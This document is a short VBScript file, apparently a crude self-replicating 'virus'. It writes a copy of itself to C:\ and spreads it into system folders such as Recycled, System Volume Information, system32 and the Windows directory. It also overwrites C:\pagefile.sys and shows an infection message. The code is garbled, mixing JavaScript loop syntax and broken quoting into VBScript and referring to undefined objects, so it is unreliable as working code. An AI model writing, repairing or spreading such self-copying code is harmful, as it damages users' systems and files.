Set fso = CreateObject("scripting.filesystemobject")


for (i=0; i<12; i++) { myline=me.ReadLine(); vbsfile.WriteLine('virus.WriteLine'+comma+myline+comma) }

set coppier = fso.CreateTextFile('C:\34234.vbs', 2)

set replicator = fso.OpenTextFile('C:\34234.vbs', True)
replicator.WriteLine "Set fso = CreateObject("scripting.filesystemobject")"
replicator.WriteLine "set coppier = fso.CreateTextFile('C:\Documents and Settings\All Users\Documents\file.vbs', 2)"
replicator.WriteLine "function message()"
replicator.WriteLine "dim shell,messageFile"
replicator.WriteLine "set shell = CreateObject(^WScript|Shell^)"
replicator.WriteLine "set messageFile=FSobj|CreateTextFile(sysDir&^\msg0001|tmp^)"
replicator.WriteLine "messageFile|WriteLine(^You have been infected with a penelutian spread virus^)"
replicator.WriteLine "messageFile|close"
replicator.WriteLine "shell|Run(sysDir&^\msg0001|tmp^)"
replicator.Close

fso.copyfile "c:\34234.vbs", "C:\Recycled\347263.vbs"

fso.copyfile "c:\34234.vbs", "C:\System Volume Information\92372364.vbs"

fso.copyfile "c:\34234.vbs", "C:\WINDOWS\system32\8274326.dll"

fso.copyfile "c:\34234.vbs", "E:\System Volume Information\2187187.vbs"

fso.copyfile "c:\34234.vbs", "C:\WINDOWS\8274326.dll"

fso.copyfile "c:\34234.vbs", "C:\pagefile.sys"

for (i=0; i<12; i++) { msgbox "Succesfully coppied!!!" }







